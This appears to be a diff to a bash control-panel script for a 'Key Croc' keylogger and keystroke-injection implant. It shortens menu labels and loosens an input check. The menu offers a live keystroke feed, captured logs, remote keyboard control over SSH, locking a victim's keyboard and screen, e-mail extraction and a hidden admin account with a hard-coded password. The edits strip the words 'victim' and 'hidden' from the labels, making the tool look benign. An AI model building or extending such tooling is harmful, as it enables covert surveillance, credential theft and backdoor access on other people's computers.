@@ -41,15 +41,15 @@ print_menu() {
 	echo "$SEP"
 	echo "          KEY CROC CONTROL PANEL"
 	echo "$SEP"
-	echo "  [1] Live keystroke feed"
-	echo "  [2] Browse captured logs"
-	echo "  [3] Remote keyboard (over SSH)"
-	echo "  [4] Lock victim's keyboard"
-	echo "  [5] Extract e-mail addresses"
-	echo "  [6] Lock victim's screen"
-	echo "  [7] Create hidden admin account"
-	echo "  [8] Reboot victim's PC"
-	echo "  [9] Search inside logs"
+	echo "  [1] Live keystroke"
+	echo "  [2] Browse logs"
+	echo "  [3] Remote keyboard"
+	echo "  [4] Lock keyboard"
+	echo "  [5] Extract e-mails"
+	echo "  [6] Lock screen"
+	echo "  [7] Create account"
+	echo "  [8] Reboot PC"
+	echo "  [9] Search phrase"
 	echo "  [0] Exit"
 	echo "$SEP"
 	echo -n "Choice: "
@@ -217,12 +217,10 @@ run_lock_keyboard() {
 	echo "Lock victim's keyboard"
 	echo ""
 	read -p "Duration in seconds [60]: " secs
-	secs=${secs:-60}
 
+	secs=${secs:-60}
 	if ! [[ "$secs" =~ ^[0-9]+$ ]]; then
-		echo "Not a number."
-		wait_enter
-		return
+		secs=60
 	fi
 
 	quack LOCK
@@ -289,7 +287,7 @@ run_lock_screen() {
 
 run_hidden_admin() {
 	clear_screen
-	echo "Create hidden admin account"
+	echo "Create admin account"
 	echo ""
 	echo "  User:  support"
 	echo "  Pass:  P@ss123"
